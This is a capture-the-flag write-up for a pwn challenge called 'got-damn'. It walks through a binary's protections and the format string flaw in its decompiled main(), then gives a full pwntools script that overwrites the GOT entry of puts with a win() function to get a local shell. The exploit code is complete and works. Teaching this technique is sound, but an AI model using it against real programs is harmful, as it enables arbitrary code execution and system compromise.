# GOT DAMN!!!!!!!!

I didn't solve any of the pwn challenges. Very skill issue indeed but that's okay it'll take more than that to bring me down muehehehe

I also f'ked up on solving this challenge because it seemed so similar to a chall i encounter previously but it wasn't what I thought it was....basically I ikut jalan sesat&#x20;

We are given the binary with the following protections:

```
❯ checksec chall     
    
[*] '/home/mfkrypt/bbctf/pwn/got-damn/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Decompiling it in `main()` , I renamed some variables

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined buffer1 [32];
  char buffer2 [328];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  initialize();
  puts("Welcome to this GOTDamn \'leave a message\' system");
  printf("Enter your name: ");
  read(0,buffer1,24);
  printf("Enter your message: ");
  read(0,buffer2,320);
  puts("Thank you");
  printf("Mr/Ms %s",buffer1);
  printf(buffer2);
  puts("Your message will be pass to the administrator");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

There is also a `win()` function that gives us a shell which we can use to return to

```c
void win(void)

{
  system("/bin/sh");
  return;
}
```

We can clearly see a format string vuln in `main()`:

```c
printf(buffer2)
```

If we try to input `%p` it will print the address of the stack

<figure><img src="../../../.gitbook/assets/image (854).png" alt=""><figcaption></figcaption></figure>

Inputting multiple `%p` 's will print the addresses of the stack contents including the buffer which is where our input resides

<figure><img src="../../../.gitbook/assets/image (855).png" alt=""><figcaption></figcaption></figure>

At the 10'th argument, we can notice it starts printing our buffer contents. `%p` in hex is `0x2570` . Because the protections for RELRO were "Partial". We can use it to overwrite the GOT (Global Offset Table) by overwriting the GOT entry of `puts()` with the address of the `win()` function. For some reason, `printf()` doesn't work....

To build the script we will use pwntools' built-in function for format string exploits:

```python
fmtstr_payload(offset, writes)
```

Now we can build the script easily

```python
from pwn import *

elf = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

io = process()

offset = 10

io.sendlineafter(b'Enter your name: ', b'kambing')


payload = fmtstr_payload(10, {elf.got['puts'] : elf.sym['win']})


io.sendlineafter(b'Enter your message: ', payload)
io.clean()
io.interactive()
```

```
❯ python3 script.py

[+] Starting local process '/home/mfkrypt/bbctf/pwn/got-damn/chall': pid 630127
[*] Switching to interactive mode
$ whoami
mfkrypt
```

